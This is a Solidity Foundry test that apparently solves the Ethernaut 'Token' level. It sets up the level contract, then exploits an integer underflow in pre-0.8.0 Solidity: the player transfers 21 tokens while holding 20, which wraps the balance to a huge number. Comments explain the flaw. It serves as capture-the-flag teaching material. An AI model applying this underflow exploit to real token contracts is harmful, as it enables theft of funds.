// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), 20);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // Before solidity 0.8.0, the subtraction of unsigned integers would not revert on underflow
        // This means that here we can transfer more than player, resulting into player's
        // balance wrapping around to a huge number, since there is no check for underflow

        vm.startPrank(player, player);

        // Trasfer just a little more than the player's balance
        level.transfer(address(levelFactory), 21);

        vm.stopPrank();
    }
}
